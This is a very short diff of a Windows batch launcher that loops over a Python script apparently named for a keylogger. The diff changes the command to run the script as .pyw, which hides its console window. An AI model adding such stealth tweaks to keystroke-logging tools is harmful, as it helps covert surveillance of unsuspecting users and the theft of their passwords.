@@ -1,4 +1,3 @@
 @echo off
-
 :start
-python K-logger_Code.py
+python K-logger_Code.pyw
